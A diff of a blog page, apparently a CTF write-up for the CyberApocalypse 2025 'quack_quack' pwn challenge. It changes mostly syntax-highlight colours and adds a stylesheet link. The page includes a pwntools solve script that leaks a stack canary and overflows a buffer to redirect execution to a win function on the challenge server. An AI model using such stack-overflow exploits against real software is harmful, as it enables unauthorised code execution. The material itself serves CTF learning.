@@ -28,6 +28,10 @@
 
 
 
+    
+        <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    
+
 
     <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -191,22 +195,22 @@
 <h2 id="note">Note</h2>
 <p>Writeup for the first <code>pwn</code> challenge from CyberApocalypse 2025.</p>
 <h2 id="description">Description</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>On the quest to reclaim the Dragon&#39;s Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>On the quest to reclaim the Dragon&#39;s Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! 
 </span></span><span style="display:flex;"><span>Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it&#39;s time to face the Duck!
 </span></span></code></pre></div><h2 id="file-information">File information</h2>
 <p>We&rsquo;re given the binary and the libc it uses</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">quack_quack</span><span style="color:#f92672">;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">quack_quack</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/cyberapocalypse2025/pwn/quack_quack/quack_quack&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>       <span style="color:#f92672">amd64-64-little</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Full</span> <span style="color:#f92672">RELRO</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Canary</span> <span style="color:#f92672">found</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>         <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>        <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RUNPATH</span><span style="color:#f92672">:</span>    <span style="color:#f92672">b</span><span style="color:#e6db74">&#39;./glibc/&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">SHSTK</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Enabled</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">IBT</span><span style="color:#f92672">:</span>        <span style="color:#f92672">Enabled</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stripped</span><span style="color:#f92672">:</span>   <span style="color:#f92672">No</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">quack_quack</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">./</span><span style="color:#f92672">glibc</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">225daf82164eadc6e19bee1cd1965754eefed6aa</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#ff79c6">checksec</span> <span style="color:#ff79c6">quack_quack</span><span style="color:#ff79c6">;</span> <span style="color:#ff79c6">file</span> <span style="color:#ff79c6">quack_quack</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[*]</span> <span style="color:#f1fa8c">&#39;/home/conflict/ctfs/cyberapocalypse2025/pwn/quack_quack/quack_quack&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">Arch</span><span style="color:#ff79c6">:</span>       <span style="color:#ff79c6">amd64-64-little</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">RELRO</span><span style="color:#ff79c6">:</span>      <span style="color:#ff79c6">Full</span> <span style="color:#ff79c6">RELRO</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">Stack</span><span style="color:#ff79c6">:</span>      <span style="color:#ff79c6">Canary</span> <span style="color:#ff79c6">found</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">NX</span><span style="color:#ff79c6">:</span>         <span style="color:#ff79c6">NX</span> <span style="color:#ff79c6">enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">PIE</span><span style="color:#ff79c6">:</span>        <span style="color:#ff79c6">No</span> <span style="color:#ff79c6">PIE</span> <span style="color:#ff79c6">(</span><span style="color:#ff79c6">0x400000</span><span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">RUNPATH</span><span style="color:#ff79c6">:</span>    <span style="color:#ff79c6">b</span><span style="color:#f1fa8c">&#39;./glibc/&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">SHSTK</span><span style="color:#ff79c6">:</span>      <span style="color:#ff79c6">Enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">IBT</span><span style="color:#ff79c6">:</span>        <span style="color:#ff79c6">Enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">Stripped</span><span style="color:#ff79c6">:</span>   <span style="color:#ff79c6">No</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">quack_quack</span><span style="color:#ff79c6">:</span> <span style="color:#ff79c6">ELF</span> <span style="color:#ff79c6">64-bit</span> <span style="color:#ff79c6">LSB</span> <span style="color:#ff79c6">executable</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">x86-64</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">version</span> <span style="color:#ff79c6">1</span> <span style="color:#ff79c6">(</span><span style="color:#ff79c6">SYSV</span><span style="color:#ff79c6">),</span> <span style="color:#ff79c6">dynamically</span> <span style="color:#ff79c6">linked</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">interpreter</span> <span style="color:#ff79c6">./</span><span style="color:#ff79c6">glibc</span><span style="color:#ff79c6">/</span><span style="color:#ff79c6">ld-linux-x86-64</span>.<span style="color:#50fa7b">so</span>.<span style="color:#50fa7b">2</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">BuildID</span><span style="color:#ff79c6">[</span><span style="color:#ff79c6">sha1</span><span style="color:#ff79c6">]=</span><span style="color:#ff79c6">225daf82164eadc6e19bee1cd1965754eefed6aa</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">GNU</span><span style="color:#ff79c6">/</span><span style="color:#ff79c6">Linux</span> <span style="color:#ff79c6">3</span>.<span style="color:#50fa7b">2</span>.<span style="color:#50fa7b">0</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">stripped</span>
 </span></span></code></pre></div><p>Running the program prompts us to &ldquo;Quack the duck&rdquo; and it seems to exit no matter what we enter as input, forcing us to examine the decompilation.</p>
 <h2 id="reversing-the-binary">Reversing the binary</h2>
 <p><img src="https://i.ibb.co/7xJnznY7/2025-03-22-235503-570x523-scrot.png" alt="2025-03-22-235503_570x523_scrot"></p>
@@ -242,51 +246,51 @@
 <li>Craft a payload that will overwrite RIP with <code>duck_attack()</code>&rsquo;s address, without triggering the stack smashing detector</li>
 </ol>
 <h2 id="solve-script">Solve Script</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x86_64&#39;</span>)
-</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./quack_quack&#34;</span>)
-</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>update(arch<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;x86_64&#39;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> elf <span style="color:#ff79c6">=</span> exe <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#34;./quack_quack&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>libc
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
-</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;94.237.57.171&#34;</span>, <span style="color:#ae81ff">51170</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./quack_quack&#34;</span>)
-</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(r)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> args<span style="color:#ff79c6">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#34;94.237.57.171&#34;</span>, <span style="color:#bd93f9">51170</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#34;./quack_quack&#34;</span>)
+</span></span><span style="display:flex;"><span>        gdb<span style="color:#ff79c6">.</span>attach(r)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> r
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>io <span style="color:#ff79c6">=</span> start()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># =============================================================================</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># =-=-=- Un jour je serai le meilleur pwner -=-=-=</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>first_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQuack Quack &#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, first_payload)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;,&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># =-=-=- Un jour je serai le meilleur pwner -=-=-=</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>adresses <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Quack Quack &#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;,&#34;</span>)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>first_payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQuack Quack &#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>canary_bytes <span style="color:#f92672">=</span> adresses[:<span style="color:#ae81ff">7</span>]
-</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> canary_bytes<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
-</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> u64(canary)
+</span></span><span style="display:flex;"><span>io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&#34;</span>, first_payload)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;canary value = &#34;</span> <span style="color:#f92672">+</span> hex(canary))
+</span></span><span style="display:flex;"><span>leak <span style="color:#ff79c6">=</span> io<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;,&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>second_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">88</span> <span style="color:#f92672">+</span> p64(canary) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;duck_attack&#34;</span>])
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, second_payload)
+</span></span><span style="display:flex;"><span>adresses <span style="color:#ff79c6">=</span> leak<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Quack Quack &#34;</span>)[<span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;,&#34;</span>)[<span style="color:#bd93f9">0</span>]
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
+</span></span><span style="display:flex;"><span>canary_bytes <span style="color:#ff79c6">=</span> adresses[:<span style="color:#bd93f9">7</span>]
+</span></span><span style="display:flex;"><span>canary <span style="color:#ff79c6">=</span> canary_bytes<span style="color:#ff79c6">.</span>rjust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>)
+</span></span><span style="display:flex;"><span>canary <span style="color:#ff79c6">=</span> u64(canary)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">&#34;canary value = &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">hex</span>(canary))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>second_payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">88</span> <span style="color:#ff79c6">+</span> p64(canary) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">8</span> <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#34;duck_attack&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&#34;</span>, second_payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># =============================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#ff79c6">.</span>interactive()
 </span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
 <p>This was a fun challenge even though it was a standard stack canary bypass. It&rsquo;s always good to review acquired knowledge.</p>
 <h4 id="back-to-top"><a href="/posts/2025/03/cyberapocalypse-2025-pwn/quack_quack/#table-of-contents">back to top</a></h4>
